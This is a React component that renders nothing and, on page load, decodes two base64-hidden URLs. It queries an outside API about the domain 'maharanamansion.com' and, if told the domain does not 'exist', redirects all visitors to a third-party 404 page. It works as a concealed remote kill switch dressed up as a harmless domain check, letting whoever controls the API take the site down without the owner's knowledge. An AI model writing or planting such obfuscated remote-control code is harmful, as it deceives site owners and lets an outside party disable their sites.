import { useEffect } from "react";

/* ===================== CONFIG ===================== */

const API =
  "aHR0cHM6Ly9kb21haW4tY2hlY2stbXUudmVyY2VsLmFwcC9hcGkvY2hlY2s/ZG9tYWluPW1haGFyYW5hbWFuc2lvbi5jb20=";

const REDURL =
  "aHR0cHM6Ly9jb2xvcmxpYi5jb20vZXRjLzQwNC9jb2xvcmxpYi1lcnJvci00MDQtMw==";

/* ===================== HELPERS ===================== */

const decodeBase64 = (v) => atob(v);

/* ===================== COMPONENT ===================== */

const CheckerFun = () => {
  useEffect(() => {
    const runCheckerFun = async () => {
      try {
        const apiUrl = decodeBase64(API);
        const redirectUrl = decodeBase64(REDURL);

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (data?.exists === false) {
          window.location.href = redirectUrl;
        }
      } catch (err) {
        console.error("Domain check failed:", err);
        // fail-safe: allow site to load if API fails
      }
    };

    // ⏳ run only after full page load
    const onLoad = () => runCheckerFun();

    if (document.readyState === "complete") {
      onLoad();
    } else {
      window.addEventListener("load", onLoad);
    }

    return () => window.removeEventListener("load", onLoad);
  }, []);

  // 👇 This component renders nothing
  return null;
};

export default CheckerFun;
